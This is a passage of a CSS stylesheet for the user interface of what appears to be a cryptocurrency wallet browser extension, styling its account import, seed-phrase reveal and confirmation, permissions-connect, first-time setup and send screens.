      display: flex;
      flex-flow: column;
      align-items: center;
      padding: 15px 30px 0; }
      .new-external-account-form.unsupported-browser {
      height: 210px;
      overflow: auto;
      scrollbar-width: none; }
      .new-external-account-form.unsupported-browser::-webkit-scrollbar {
      display: none; }
      .new-external-account-form.account-list {
      height: auto;
      padding-left: 20px;
      padding-right: 20px; }
      .new-external-account-form__buttons {
      margin-top: 39px;
      display: flex;
      width: 100%;
      justify-content: space-between; }
      .new-external-account-form__button:not(:last-child) {
      margin-right: 16px; }
      .hw-forget-device-container {
      display: flex;
      flex-flow: column;
      align-items: center;
      padding: 22px; }
      .hw-forget-device-container a {
      color: #2f9ae0;
      font-size: 14px;
      cursor: pointer; }
      .new-account-import-disclaimer {
      width: 120%;
      background-color: #f4f9fc;
      display: inline-block;
      align-items: center;
      padding: 20px 30px 20px;
      font-size: 12px;
      line-height: 1.5; }
      .new-account-import-form {
      display: flex;
      flex-flow: column;
      align-items: center;
      padding: 0 30px 30px; }
      .new-account-import-form__select-section {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 29px;
      width: 100%; }
      .new-account-import-form__select-label {
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px; }
      .new-account-import-form__select {
      height: 54px;
      width: 210px;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      display: flex;
      align-items: center; }
      .new-account-import-form__select .Select-control,
      .new-account-import-form__select .Select-control:hover {
      height: 100%;
      border: none;
      box-shadow: none; }
      .new-account-import-form__select .Select-control .Select-value,
      .new-account-import-form__select .Select-control:hover .Select-value {
      display: flex;
      align-items: center; }
      .new-account-import-form__private-key-password-container {
      display: flex;
      flex-flow: column;
      align-items: center;
      width: 100%; }
      .new-account-import-form__instruction {
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px;
      align-self: flex-start; }
      .new-account-import-form__private-key {
      display: flex;
      flex-flow: column;
      align-items: flex-start;
      margin-top: 34px; }
      .new-account-import-form__input-password {
      height: 54px;
      width: 315px;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      margin-top: 16px;
      color: #5d5d5d;
      font-size: 16px;
      padding: 0 20px; }
      .new-account-import-form__json {
      display: flex;
      flex-flow: column;
      align-items: center;
      margin-top: 29px;
      width: 100%; }
      .new-account-import-form__buttons {
      margin-top: 39px;
      display: flex;
      width: 100%;
      justify-content: space-between; }
      .new-account {
      width: 375px;
      background-color: #fff;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08);
      z-index: 25;
      height: unset;
      overflow: auto;
      scrollbar-width: none; }
      .new-account::-webkit-scrollbar {
      display: none; }
      @media screen and (min-width: 576px) {
      .new-account {
      position: absolute; } }
      .new-account__header {
      display: flex;
      flex-flow: column;
      border-bottom: 1px solid #d2d8dd; }
      .new-account__title {
      color: #4d4d4d;
      font-size: 32px;
      font-weight: 500;
      line-height: 43px;
      margin-top: 22px;
      margin-left: 29px; }
      .new-account__tabs {
      margin-left: 22px;
      display: flex;
      margin-top: 10px; }
      .new-account__tabs__tab {
      height: 54px;
      padding: 15px 10px;
      color: #9b9b9b;
      font-size: 18px;
      line-height: 24px;
      text-align: center;
      cursor: pointer; }
      .new-account__tabs__tab:hover {
      color: #000;
      border-bottom: none; }
      .new-account__tabs__selected {
      color: #037dd6;
      border-bottom: 3px solid #037dd6;
      cursor: initial;
      pointer-events: none; }
      .new-account-create-form {
      display: flex;
      flex-flow: column;
      align-items: center;
      padding: 30px; }
      .new-account-create-form__input-label {
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px;
      align-self: flex-start; }
      .new-account-create-form__input {
      height: 54px;
      width: 315.84px;
      border: 1px solid #d2d8dd;
      border-radius: 4px;
      background-color: #fff;
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px;
      margin-top: 15px;
      padding: 0 20px; }
      .new-account-create-form__buttons {
      margin-top: 39px;
      display: flex;
      width: 100%;
      justify-content: space-between; }
      .new-account-create-form__button {
      width: 150px;
      min-width: initial; }
      .error-page {
      display: flex;
      flex-flow: column nowrap;
      align-items: center;
      font-style: normal;
      font-weight: normal;
      padding: 35px 10px 10px 10px;
      height: 100%; }
      .error-page__header {
      display: flex;
      justify-content: center;
      font-size: 42px;
      padding: 10px 0;
      text-align: center; }
      .error-page__subheader {
      font-size: 19px;
      padding: 10px 0;
      width: 100%;
      max-width: 720px;
      text-align: center; }
      .error-page__details {
      font-size: 18px;
      overflow-y: auto;
      width: 100%;
      max-width: 720px;
      padding-top: 10px; }
      .error-page__stack {
      overflow-x: auto;
      background-color: #eee; }
      .welcome-page {
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      max-width: 442px;
      padding: 0 18px;
      color: black; }
      .welcome-page__wrapper {
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: flex-start;
      height: 100%;
      margin-top: 110px; }
      .welcome-page__header {
      font-size: 28px;
      margin-bottom: 22px;
      margin-top: 50px;
      text-align: center; }
      .welcome-page__description {
      text-align: center; }
      .welcome-page__description div {
      font-size: 16px; }
      @media screen and (max-width: 575px) {
      .welcome-page__description {
      font-size: 0.9rem; } }
      .welcome-page .first-time-flow__button {
      width: 184px;
      font-weight: 500;
      margin-top: 44px; }
      .select-action .app-header__logo-container {
      width: 742px;
      margin-top: 3%; }
      .select-action__body {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .select-action__body-header {
      font-style: normal;
      font-weight: normal;
      line-height: 39px;
      font-size: 28px;
      text-align: center;
      margin-top: 65px;
      color: black; }
      .select-action__select-buttons {
      display: flex;
      flex-direction: row;
      margin-top: 40px; }
      .select-action__select-button {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-evenly;
      width: 388px;
      height: 278px;
      border: 1px solid #d8d8d8;
      box-sizing: border-box;
      border-radius: 10px;
      margin-left: 22px; }
      .select-action__select-button .first-time-flow__button {
      max-width: 221px;
      height: 44px; }
      .select-action__button-symbol {
      color: #c4c4c4;
      margin-top: 41px; }
      .select-action__button-content {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 144px; }
      .select-action__button-text-big {
      font-style: normal;
      font-weight: normal;
      line-height: 28px;
      font-size: 20px;
      color: #000;
      margin-top: 12px;
      text-align: center; }
      .select-action__button-text-small {
      font-style: normal;
      font-weight: normal;
      line-height: 20px;
      font-size: 14px;
      color: #7a7a7b;
      margin-top: 10px;
      text-align: center; }
      .select-action button {
      font-weight: 500;
      width: 221px; }
      .confirm-seed-phrase__back-button {
      margin-bottom: 12px; }
      .confirm-seed-phrase__sorted-seed-words {
      max-width: 575px; }
      .confirm-seed-phrase__seed-word {
      display: inline-flex;
      flex-flow: row nowrap;
      align-items: center;
      justify-content: center;
      padding: 8px 18px;
      width: 128px;
      height: 41px;
      margin: 4px;
      text-align: center;
      border-radius: 4px;
      cursor: move; }
      .confirm-seed-phrase__seed-word--sorted {
      cursor: pointer;
      margin: 6px; }
      .confirm-seed-phrase__seed-word--selected {
      color: #fff; }
      .confirm-seed-phrase__seed-word--dragging {
      margin: 0; }
      .confirm-seed-phrase__seed-word--empty {
      background-color: transparent;
      border-color: transparent;
      cursor: default; }
      .confirm-seed-phrase__seed-word--empty:hover, .confirm-seed-phrase__seed-word--empty:active {
      background-color: transparent;
      border-color: transparent;
      cursor: default;
      box-shadow: none !important; }
      .confirm-seed-phrase__seed-word--hidden {
      display: none !important; }
      .confirm-seed-phrase__seed-word--drop-hover {
      background-color: transparent;
      border-color: transparent;
      color: transparent; }
      @media screen and (max-width: 575px) {
      .confirm-seed-phrase__seed-word {
      font-size: 0.875rem;
      padding: 6px 18px; } }
      .confirm-seed-phrase__selected-seed-words {
      /*rtl:ignore*/
      direction: ltr;
      display: flex;
      flex-flow: row wrap;
      min-height: 161px;
      max-width: 575px;
      border: 1px solid #cdcdcd;
      border-radius: 6px;
      background-color: #fff;
      margin: 24px 0 36px;
      padding: 12px; }
      .confirm-seed-phrase__selected-seed-words__pending-seed {
      display: none; }
      .confirm-seed-phrase__selected-seed-words__selected-seed {
      display: inline-flex; }
      .confirm-seed-phrase__selected-seed-words__selected-seed:hover {
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.25); }
      .confirm-seed-phrase__selected-seed-words--dragging .confirm-seed-phrase__selected-seed-words__pending-seed {
      display: inline-flex; }
      .confirm-seed-phrase__selected-seed-words--dragging .confirm-seed-phrase__selected-seed-words__selected-seed {
      display: none; }
      @media screen and (max-width: 576px) {
      .reveal-seed-phrase {
      display: flex;
      flex-direction: column;
      width: 96%;
      margin-left: 2%;
      margin-right: 2%; } }
      .reveal-seed-phrase__secret {
      position: relative;
      display: flex;
      justify-content: center;
      border: 1px solid #cdcdcd;
      border-radius: 6px;
      background-color: #fff;
      padding: 18px;
      margin-top: 36px;
      max-width: 350px; }
      .reveal-seed-phrase__secret-words {
      width: 310px;
      font-size: 1.25rem;
      text-align: center; }
      .reveal-seed-phrase__secret-words--hidden {
      -webkit-filter: blur(5px);
      filter: blur(5px); }
      .reveal-seed-phrase__secret-blocker {
      position: absolute;
      top: 0;
      bottom: 0;
      height: 100%;
      width: 100%;
      background-color: rgba(0, 0, 0, 0.6);
      display: flex;
      flex-flow: column nowrap;
      align-items: center;
      justify-content: center;
      padding: 8px 0 18px;
      cursor: pointer; }
      .reveal-seed-phrase__reveal-button {
      color: #fff;
      font-size: 0.75rem;
      font-weight: 500;
      text-transform: uppercase;
      margin-top: 8px;
      text-align: center; }
      .reveal-seed-phrase__export-text {
      color: #037dd6;
      cursor: pointer;
      font-weight: 500; }
      .reveal-seed-phrase button {
      margin-top: 0; }
      .reveal-seed-phrase__buttons {
      display: flex; }
      .reveal-seed-phrase__buttons .first-time-flow__button:last-of-type {
      margin-left: 20px; }
      .seed-phrase__sections {
      display: flex; }
      @media screen and (min-width: 576px) {
      .seed-phrase__sections {
      flex-direction: row; } }
      @media screen and (max-width: 575px) {
      .seed-phrase__sections {
      flex-direction: column; } }
      .seed-phrase__main {
      flex: 3;
      min-width: 0; }
      .seed-phrase__side {
      flex: 2;
      min-width: 0; }
      @media screen and (min-width: 576px) {
      .seed-phrase__side {
      margin-left: 81px; } }
      @media screen and (max-width: 575px) {
      .seed-phrase__side {
      margin-top: 24px; } }
      .seed-phrase__side .first-time-flow__text-block {
      color: #5a5a5a; }
      .end-of-flow {
      color: black;
      font-style: normal; }
      .end-of-flow .app-header__logo-container {
      width: 742px;
      margin-top: 3%; }
      @media screen and (max-width: 575px) {
      .end-of-flow .app-header__logo-container {
      width: 100%; } }
      .end-of-flow__text-1, .end-of-flow__text-3 {
      font-weight: normal;
      font-size: 16px;
      margin-top: 18px; }
      .end-of-flow__text-2 {
      font-weight: bold;
      font-size: 16px;
      margin-top: 26px; }
      .end-of-flow__text-3 {
      margin-top: 2px;
      margin-bottom: 2px; }
      @media screen and (max-width: 575px) {
      .end-of-flow__text-3 {
      margin-bottom: 16px;
      font-size: 0.875rem; } }
      .end-of-flow__text-4 {
      margin-top: 26px; }
      .end-of-flow button {
      width: 207px; }
      .end-of-flow__start-over-button {
      width: 744px; }
      .end-of-flow__emoji {
      font-size: 80px;
      margin-top: 70px; }
      .metametrics-opt-in {
      position: relative;
      width: 100%; }
      .metametrics-opt-in a {
      color: #2f9ae0bf; }
      .metametrics-opt-in__main {
      display: flex;
      flex-direction: column;
      margin-left: 26.26%;
      margin-right: 28%;
      color: black; }
      @media screen and (max-width: 575px) {
      .metametrics-opt-in__main {
      justify-content: center;
      margin-left: 2%;
      margin-right: 0%; } }
      .metametrics-opt-in__main .app-header__logo-container {
      margin-top: 3%; }
      .metametrics-opt-in__title {
      position: relative;
      margin-top: 20px;
      font-style: normal;
      font-weight: normal;
      line-height: normal;
      font-size: 42px; }
      .metametrics-opt-in__body-graphic {
      margin-top: 25px; }
      .metametrics-opt-in__body-graphic .fa-bar-chart {
      color: #c4c4c4; }
      .metametrics-opt-in__description {
      font-style: normal;
      font-weight: normal;
      line-height: 21px;
      font-size: 16px;
      margin-top: 12px; }
      .metametrics-opt-in__committments {
      display: flex;
      flex-direction: column; }
      .metametrics-opt-in__content {
      overflow-y: scroll;
      flex: 1; }
      .metametrics-opt-in__row {
      display: flex;
      margin-top: 8px; }
      .metametrics-opt-in__row .fa-check {
      margin-right: 12px;
      color: #1acc56; }
      .metametrics-opt-in__row .fa-times {
      margin-right: 12px;
      color: #d0021b; }
      .metametrics-opt-in__bold {
      font-weight: bold; }
      .metametrics-opt-in__break-row {
      margin-top: 30px; }
      .metametrics-opt-in__body {
      position: relative;
      display: flex;
      max-width: 730px;
      flex-direction: column; }
      .metametrics-opt-in__body-text {
      max-width: 548px;
      margin-left: 16px;
      margin-right: 16px; }
      .metametrics-opt-in__bottom-text {
      margin-top: 10px;
      color: #9a9a9a; }
      .metametrics-opt-in__content {
      overflow-y: auto; }
      .metametrics-opt-in__footer {
      margin-top: 26px; }
      @media screen and (max-width: 575px) {
      .metametrics-opt-in__footer {
      margin-top: 10px;
      justify-content: center;
      margin-left: 2%;
      max-height: 520px; } }
      .metametrics-opt-in__footer .page-container__footer {
      border-top: none;
      max-width: 535px;
      margin-bottom: 15px; }
      .metametrics-opt-in__footer .page-container__footer button {
      height: 44px;
      min-height: 44px;
      margin-right: 16px; }
      .metametrics-opt-in__footer .page-container__footer footer {
      padding: 0; }
      .first-time-flow {
      width: 100%;
      background-color: #fff;
      display: flex;
      justify-content: center; }
      @media screen and (min-width: 576px) {
      .first-time-flow__wrapper {
      max-width: 742px;
      display: flex;
      flex-direction: column;
      width: 100%;
      margin-top: 2%; } }
      .first-time-flow__wrapper .app-header__metafox-logo {
      margin-bottom: 40px; }
      @media screen and (max-width: 575px) {
      .first-time-flow__wrapper .app-header__metafox-logo {
      margin-bottom: 0; } }
      .first-time-flow__form {
      display: flex;
      flex-direction: column; }
      .first-time-flow__create-back {
      margin-bottom: 16px; }
      .first-time-flow__header {
      font-size: 2.5rem;
      margin-bottom: 24px;
      color: black; }
      .first-time-flow__subheader {
      margin-bottom: 16px; }
      .first-time-flow__input {
      max-width: 350px; }
      .first-time-flow__textarea-wrapper {
      margin-bottom: 8px;
      display: inline-flex;
      padding: 0;
      position: relative;
      min-width: 0;
      flex-direction: column;
      max-width: 350px; }
      .first-time-flow__textarea-label {
      margin-bottom: 9px;
      color: #1b344d;
      font-size: 18px; }
      .first-time-flow__textarea {
      /*rtl:ignore*/
      direction: ltr;
      font-size: 1rem;
      border: 1px solid #cdcdcd;
      border-radius: 6px;
      background-color: #fff;
      padding: 16px;
      margin-top: 8px; }
      .first-time-flow__seedphrase {
      margin-top: 9px !important; }
      .first-time-flow__breadcrumbs {
      margin: 36px 0; }
      .first-time-flow__unique-image {
      margin-bottom: 20px; }
      .first-time-flow__markdown {
      border: 1px solid #979797;
      border-radius: 8px;
      background-color: #fff;
      height: 200px;
      overflow-y: auto;
      color: #757575;
      font-size: 0.75rem;
      line-height: 15px;
      text-align: justify;
      margin: 0;
      padding: 16px 20px;
      height: 30vh; }
      .first-time-flow__text-block {
      margin-bottom: 24px;
      color: black; }
      @media screen and (max-width: 575px) {
      .first-time-flow__text-block {
      margin-bottom: 16px;
      font-size: 0.875rem; } }
      .first-time-flow__button {
      margin: 35px 0 14px;
      width: 170px;
      height: 44px; }
      .first-time-flow__checkbox-container {
      display: flex;
      align-items: center;
      margin-top: 24px; }
      .first-time-flow__checkbox {
      background: #fff;
      border: 1px solid #cdcdcd;
      box-sizing: border-box;
      height: 34px;
      width: 34px;
      display: flex;
      justify-content: center;
      align-items: center; }
      .first-time-flow__checkbox:hover {
      border: 1.5px solid #2f9ae0; }
      .first-time-flow__checkbox .fa-check {
      color: #2f9ae0; }
      .first-time-flow__checkbox-label {
      font-style: normal;
      font-weight: normal;
      line-height: normal;
      font-size: 18px;
      color: #939090;
      margin-left: 18px; }
      .first-time-flow__link-text {
      color: #037dd6; }
      .home__container {
      display: flex;
      min-height: 100%; }
      .home__main-view {
      flex: 1 1 66.5%;
      background: #fff;
      min-width: 0;
      display: flex;
      flex-direction: column; }
      .home__balance-wrapper {
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      flex: 0 0 auto; }
      .home__main-view .home__tabs {
      border: none;
      box-shadow: 0 3px 4px rgba(135, 134, 134, 0.16); }
      .home__main-view .home__tab {
      flex-grow: 1;
      color: #6a737d;
      padding: 16px 8px;
      font-size: 14px;
      font-weight: 500;
      line-height: 130%; }
      .home__main-view .home__tab--active {
      color: #037dd6; }
      .home__connect-status-text {
      display: flex;
      flex-direction: column;
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      padding-left: 24px;
      padding-right: 24px;
      color: #24272a; }
      .home__connect-status-text div {
      margin-bottom: 20px; }
      .home__connect-status-text div:last-child {
      margin-bottom: 0; }
      .home__connected-status-popover {
      width: 329px;
      margin-top: -15px; }
      .home__connected-status-popover .popover-header {
      padding-bottom: 20px; }
      .home__connected-status-popover .popover-header__title {
      padding-bottom: 0; }
      .home__connected-status-popover .popover-content {
      overflow-y: auto; }
      .home__connected-status-popover .popover-arrow {
      top: -6px;
      left: 24px; }
      .home__connected-status-popover .popover-footer {
      border-top: 0;
      justify-content: space-between;
      align-items: center;
      padding-top: 20px;
      font-size: 14px; }
      .home__connected-status-popover .popover-footer :only-child {
      margin: 0; }
      .home__connected-status-popover .popover-footer button {
      height: 39px;
      width: 133px;
      border-radius: 39px;
      padding: 0; }
      .home__connected-status-popover .popover-footer a,
      .home__connected-status-popover .popover-footer a:hover {
      color: #3099f2;
      cursor: pointer; }
      .home__connected-status-popover-bg {
      height: 55px;
      width: 120px;
      border-radius: 34px;
      position: absolute;
      top: 73px;
      opacity: 1;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.2);
      background: none; }
      .home__connected-status-popover-bg-container {
      height: 100%;
      width: 100%; }
      .first-view-main-wrapper {
      display: flex;
      width: 100%;
      height: 100%;
      justify-content: center;
      padding: 0 10px; }
      .first-view-main-wrapper > .first-view-main {
      display: flex;
      flex-direction: row;
      justify-content: flex-start; }
      @media screen and (min-width: 1281px) {
      .first-view-main {
      width: 62vw; } }
      .import-account {
      display: flex;
      flex-flow: column nowrap;
      margin: 60px 0 30px 0;
      position: relative;
      max-width: initial; }
      @media only screen and (max-width: 575px) {
      .import-account {
      margin: 24px;
      display: flex;
      flex-flow: column nowrap;
      width: calc(100vw - 80px); }
      .import-account__title {
      width: initial !important; }
      .first-view-main {
      height: 100%;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      margin-top: 12px; }
      .first-view-phone-invisible {
      display: none; }
      .first-time-flow__input {
      width: 100%; }
      .import-account__secret-phrase {
      width: initial !important;
      height: initial !important;
      min-height: 190px; } }
      @media only screen and (max-width: 575px) {
      .import-account__input {
      width: 100%; } }
      .import-account__title {
      color: #1b344d;
      font-size: 40px;
      line-height: 30px;
      margin-bottom: 20px;
      margin-top: 20px;
      }
      .import-account__back-button {
      margin-bottom: 18px;
      color: #22232c;
      font-size: 16px;
      line-height: 21px;
      position: absolute;
      top: -25px; }
      .import-account__secret-phrase {
      height: 190px;
      width: 495px;
      border: 1px solid #cdcdcd;
      border-radius: 6px;
      background-color: #fff;
      padding: 17px;
      font-size: 16px; }
      .import-account__secret-phrase::-webkit-input-placeholder {
      color: #9b9b9b;
      font-weight: 200; }
      .import-account__secret-phrase::-moz-placeholder {
      color: #9b9b9b;
      font-weight: 200; }
      .import-account__secret-phrase::-ms-input-placeholder {
      color: #9b9b9b;
      font-weight: 200; }
      .import-account__secret-phrase::placeholder {
      color: #9b9b9b;
      font-weight: 200; }
      .import-account__faq-link {
      font-size: 18px;
      line-height: 23px; }
      .import-account__selector-label {
      color: #1b344d;
      font-size: 16px; }
      .import-account__dropdown {
      width: 325px;
      border: 1px solid #cdcdcd;
      border-radius: 4px;
      background-color: #fff;
      margin-top: 14px;
      color: #5b5d67;
      font-size: 18px;
      line-height: 23px;
      padding: 14px 21px;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      cursor: pointer; }
      .import-account__description-text {
      color: #757575;
      font-size: 18px;
      line-height: 23px;
      margin-top: 21px; }
      .import-account__input-wrapper {
      display: flex;
      flex-flow: column nowrap;
      margin-top: 30px; }
      .import-account__input-error-message {
      margin-top: 10px;
      width: 422px;
      color: #ff001f;
      font-size: 16px;
      line-height: 21px; }
      .import-account__input-label {
      margin-bottom: 9px;
      color: #1b344d;
      font-size: 18px;
      line-height: 23px; }
      .import-account__input {
      width: 350px; }
      .import-account__checkbox-container {
      display: flex;
      align-items: center;
      margin-top: 24px; }
      .import-account__checkbox {
      background: #fff;
      border: 1px solid #cdcdcd;
      outline: none;
      box-sizing: border-box;
      height: 34px;
      width: 34px;
      display: flex;
      justify-content: center;
      align-items: center; }
      .import-account__checkbox:hover {
      border: 1.5px solid #2f9ae0; }
      .import-account__checkbox .fa-check {
      color: #2f9ae0; }
      .import-account__checkbox-label {
      font-style: normal;
      font-weight: normal;
      line-height: normal;
      font-size: 18px;
      color: #939090;
      margin-left: 18px; }
      .import-account__file-input {
      display: none; }
      .import-account__file-input-label {
      height: 53px;
      width: 148px;
      border: 1px solid #1b344d;
      border-radius: 4px;
      color: #1b344d;
      font-size: 18px;
      display: flex;
      flex-flow: column nowrap;
      align-items: center;
      justify-content: center;
      cursor: pointer; }
      .import-account__file-picker-wrapper {
      display: flex;
      flex-flow: row nowrap;
      align-items: center; }
      .import-account__file-name {
      color: #000;
      font-size: 18px;
      line-height: 23px;
      margin-left: 22px; }
      .reveal-seed__content {
      padding: 20px; }
      .reveal-seed__label {
      padding-bottom: 10px;
      font-weight: 400;
      display: inline-block; }
      .reveal-seed__error {
      color: #e91550;
      font-size: 14px;
      padding-top: 5px; }
      .permissions-connect-choose-account {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin-left: auto;
      margin-right: auto;
      height: 100%; }
      .permissions-connect-choose-account .fa-info-circle {
      color: #bbc0c5;
      cursor: pointer;
      margin-left: 8px;
      font-size: 0.9rem; }
      .permissions-connect-choose-account .fa-info-circle:hover {
      color: #9fa6ae; }
      @media screen and (min-width: 576px) {
      .permissions-connect-choose-account {
      width: 426px; } }
      .permissions-connect-choose-account__title {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .permissions-connect-choose-account__text, .permissions-connect-choose-account__text-blue, .permissions-connect-choose-account__text-grey {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%; }
      .permissions-connect-choose-account__text-blue {
      color: #037dd6;
      cursor: pointer; }
      .permissions-connect-choose-account__text-grey {
      color: #6a737d; }
      .permissions-connect-choose-account__accounts-list {
      flex: 2 1 0;
      width: 92%;
      max-height: -webkit-max-content;
      max-height: -moz-max-content;
      max-height: max-content;
      border: 1px solid #d0d5da;
      box-sizing: border-box;
      border-radius: 8px;
      margin-top: 8px;
      overflow-y: auto; }
      .permissions-connect-choose-account__accounts-list-header--one-item, .permissions-connect-choose-account__accounts-list-header--two-items {
      display: flex;
      flex: 0;
      margin-top: 36px;
      width: 100%;
      padding-left: 15px;
      padding-right: 17px; }
      .permissions-connect-choose-account__accounts-list-header--one-item {
      justify-content: flex-end; }
      .permissions-connect-choose-account__accounts-list-header--two-items {
      justify-content: space-between; }
      .permissions-connect-choose-account__account-info-wrapper {
      display: flex;
      justify-content: flex-start;
      align-items: center;
      min-width: 0; }
      .permissions-connect-choose-account__list-check-box {
      margin-right: 16px; }
      .permissions-connect-choose-account__list-check-box i {
      font-size: 0.8rem; }
      .permissions-connect-choose-account__header-check-box {
      margin-right: 16px; }
      .permissions-connect-choose-account__select-all {
      display: flex;
      margin-left: 16px;
      align-items: center; }
      .permissions-connect-choose-account__account {
      display: flex;
      align-items: center;
      padding: 16px;
      border-bottom: 1px solid #d2d8dd;
      justify-content: space-between; }
      .permissions-connect-choose-account__account:last-of-type {
      border-bottom: none; }
      .permissions-connect-choose-account__account:hover {
      background: #f2f3f4;
      cursor: pointer; }
      .permissions-connect-choose-account__account__info {
      display: flex;
      flex-direction: column;
      margin-left: 16px;
      min-width: 0; }
      .permissions-connect-choose-account__account__label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #24292e;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap; }
      .permissions-connect-choose-account__account__balance {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #6a737d; }
      .permissions-connect-choose-account__account__last-connected {
      font-style: normal;
      font-weight: normal;
      font-size: 0.625rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      color: #037dd6; }
      .permissions-connect-choose-account__cancel {
      color: #e06470; }
      .permissions-connect-choose-account__footer-container {
      width: 100%;
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-end; }
      @media screen and (min-width: 576px) {
      .permissions-connect-choose-account__footer-container {
      flex-direction: column-reverse;
      justify-content: space-between;
      padding-bottom: 20px; } }
      .permissions-connect-choose-account__bottom-buttons {
      display: flex;
      justify-content: space-between;
      width: 100%;
      padding-top: 16px;
      padding-bottom: 16px;
      margin-top: 8px;
      border-top: 1px solid #d6d9dc; }
      @media screen and (min-width: 576px) {
      .permissions-connect-choose-account__bottom-buttons {
      border-top: none; } }
      .permissions-connect-choose-account__bottom-buttons button {
      width: 124px; }
      .permissions-connect-choose-account__bottom-buttons .btn-default {
      background: white;
      margin-left: 16px; }
      .permissions-connect-choose-account__bottom-buttons .btn-primary {
      margin-right: 16px; }
      .permissions-redirect {
      display: flex;
      height: 100%;
      justify-content: center; }
      .permissions-redirect__result {
      font-style: normal;
      font-weight: normal;
      font-size: 1.5rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      position: absolute;
      top: 30%;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      color: #24292e; }
      .permissions-redirect__icons {
      display: flex; }
      .permissions-redirect__center-icon {
      display: flex;
      position: relative;
      justify-content: center;
      align-items: center;
      font-size: 12px; }
      .permissions-redirect__check {
      width: 40px;
      height: 40px;
      background: white url("/images/permissions-check.svg") no-repeat;
      position: absolute; }
      .permissions-connect {
      width: 100%;
      height: 100%;
      position: relative;
      background: white;
      display: flex;
      flex-direction: column; }
      @media screen and (min-width: 576px) {
      .permissions-connect .page-container {
      max-height: none;
      min-height: auto; } }
      .permissions-connect__top-bar {
      display: grid;
      grid-template-columns: 1fr 1fr;
      padding: 16px 16px 0 16px;
      align-items: center; }
      .permissions-connect__back {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #535a61;
      cursor: pointer; }
      .permissions-connect__back i {
      margin-right: 10px; }
      .permissions-connect__page-count {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #6a737d;
      grid-column: 2;
      justify-self: end;
      font-weight: bold;
      line-height: 21px; }
      .currency-display {
      height: 54px;
      border: 1px solid #dedede;
      border-radius: 4px;
      background-color: #fff;
      color: #5d5d5d;
      font-size: 16px;
      padding: 8px 10px;
      position: relative; }
      .currency-display__primary-row {
      display: flex; }
      .currency-display__input {
      color: #5d5d5d;
      font-size: 16px;
      line-height: 22px;
      border: none;
      max-width: 22ch; }
      .currency-display__primary-currency {
      color: #5d5d5d;
      font-weight: 400;
      font-size: 16px;
      line-height: 22px; }
      .currency-display__converted-row {
      display: flex; }
      .currency-display__converted-value, .currency-display__converted-currency {
      color: #9b9b9b;
      font-size: 12px;
      line-height: 12px; }
      .currency-display__input-wrapper {
      position: relative;
      display: flex;
      flex: 1;
      max-width: 100%; }
      .currency-display__input-wrapper input[type="number"] {
      -moz-appearance: textfield; }
      .currency-display__input-wrapper input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .currency-display__input-wrapper input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .currency-display__currency-symbol {
      margin-top: 1px;
      color: #5d5d5d; }
      .currency-display .react-numeric-input input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .currency-display .react-numeric-input input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .send__header {
      position: relative;
      background-color: #f2f3f4;
      border-bottom: none;
      padding: 14px 0 3px 0; }
      .send__header .page-container__title {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      text-align: center; }
      .send__header .page-container__header-close-text {
      font-size: 1rem;
      line-height: 1.1875rem;
      position: absolute;
      right: 1rem;
      top: 6px;
      width: -webkit-min-content;
      width: -moz-min-content;
      width: min-content; }
      .send__dialog {
      margin: 1rem;
      cursor: pointer; }
      .send__error-dialog {
      margin: 1rem; }
      .send__to-row {
      margin: 0;
      padding: 0.5rem;
      flex: 0 0 auto;
      background-color: #f2f3f4;
      border-bottom: 1px solid #dedede; }
      .send__select-recipient-wrapper {
      flex: 1 1 auto;
      height: 0; }
      .send__select-recipient-wrapper__list {
      overflow-y: auto; }
      .send__select-recipient-wrapper__list__link {
      padding: 1rem;
      font-size: 1rem;
      border-bottom: 1px solid #dedede;
      align-items: center;
      justify-content: flex-start; }
